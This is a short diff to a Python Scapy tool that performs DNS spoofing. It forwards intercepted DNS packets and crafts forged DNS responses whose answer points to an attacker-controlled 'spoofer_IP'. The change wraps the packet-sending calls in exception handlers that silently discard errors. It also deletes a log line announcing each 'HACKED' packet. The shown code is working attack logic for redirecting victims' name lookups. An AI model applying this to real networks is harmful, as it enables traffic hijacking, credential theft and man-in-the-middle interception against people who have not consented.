@@ -78,7 +78,10 @@ def forward_dns(pkt, dst_ip):
 
     if dst_MAC:
         pkt[Ether].dst = dst_MAC
-        sendp(pkt, verbose=False)
+        try:
+            sendp(pkt, verbose=False)
+        except Exception as e:
+            pass
     #    if IP in pkt:
     #        print("Forwarding package from" + str(pkt[IP].src) + " to " + str(pkt[IP].dst) + " for domain name "+ str(pkt[DNS][DNSQR].qname.decode('utf-8')) + " On a request " + str(pkt.getlayer(DNS).qd.qtype))
     #    else :
@@ -104,5 +107,7 @@ def create_dns_response(website, dns, network, pkt, req_src_ip, req_dst_ip, doma
         an=DNSRR(rrname=domain_name,ttl=10,rdata=spoofer_IP)
     )
     fake_dns_response = fake_ether/fake_IP/fake_UDP/fake_DNS
-    sendp(fake_dns_response, verbose=False)
-    print("Send an HACKED package at "+ str(fake_dns_response[IP].src) + " for domain name "+ str(fake_dns_response[DNS][DNSQR].qname.decode('utf-8')))
+    try:
+        sendp(fake_dns_response, verbose=False)
+    except Exception as e:
+        pass
